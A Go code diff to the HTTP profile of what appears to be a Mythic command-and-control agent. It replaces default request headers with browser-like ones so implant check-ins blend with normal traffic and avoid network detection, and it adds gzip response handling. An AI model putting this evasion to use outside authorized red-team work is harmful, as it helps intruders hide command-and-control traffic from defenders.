@@ -2,6 +2,7 @@ package http
 
 import (
 	"bytes"
+	"compress/gzip"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/hmac"
@@ -178,7 +179,7 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 	}
 
 	// Read and process the checkin response to extract callback UUID
-	respBody, err := io.ReadAll(resp.Body)
+	respBody, err := readResponseBody(resp)
 	if err != nil {
 		return fmt.Errorf("failed to read checkin response: %w", err)
 	}
@@ -290,7 +291,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.S
 		return nil, nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
 	}
 
-	respBody, err := io.ReadAll(resp.Body)
+	respBody, err := readResponseBody(resp)
 	if err != nil {
 		// log.Printf("[DEBUG] Failed to read GetTasking response body: %v", err)
 		return nil, nil, fmt.Errorf("failed to read response body: %w", err)
@@ -542,7 +543,7 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 	defer resp.Body.Close()
 
 	// Read response body
-	respBody, err := io.ReadAll(resp.Body)
+	respBody, err := readResponseBody(resp)
 	if err != nil {
 		return nil, fmt.Errorf("failed to read PostResponse body: %w", err)
 	}
@@ -633,12 +634,19 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 		return nil, fmt.Errorf("failed to create request: %w", err)
 	}
 
-	// Set headers for Mythic C2
+	// Set browser-realistic default headers to blend with legitimate traffic.
+	// These match common browser behavior and avoid network-level IOCs
+	// (e.g., bare Content-Type: text/plain or missing Accept-Language).
+	// All defaults are overridable via CustomHeaders from the C2 profile.
 	req.Header.Set("User-Agent", h.UserAgent)
-	req.Header.Set("Content-Type", "text/plain")
-	req.Header.Set("Accept", "*/*")
+	if body != nil {
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	}
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Accept-Encoding", "gzip, deflate")
 
-	// Apply custom headers from C2 profile
+	// Apply custom headers from C2 profile — these override any defaults above
 	for k, v := range h.CustomHeaders {
 		req.Header.Set(k, v)
 	}
@@ -662,6 +670,22 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 	}
 
 	return resp, nil
+}
+
+// readResponseBody reads and decompresses the response body if needed.
+// When Accept-Encoding is set explicitly (for OPSEC-realistic headers), Go's
+// http.Transport does NOT auto-decompress responses. This helper transparently
+// handles gzip-compressed responses from CDNs, proxies, or load balancers.
+func readResponseBody(resp *http.Response) ([]byte, error) {
+	if resp.Header.Get("Content-Encoding") == "gzip" {
+		gr, err := gzip.NewReader(resp.Body)
+		if err != nil {
+			return nil, fmt.Errorf("gzip decompression failed: %w", err)
+		}
+		defer gr.Close()
+		return io.ReadAll(gr)
+	}
+	return io.ReadAll(resp.Body)
 }
 
 // getString safely gets a string value from a map
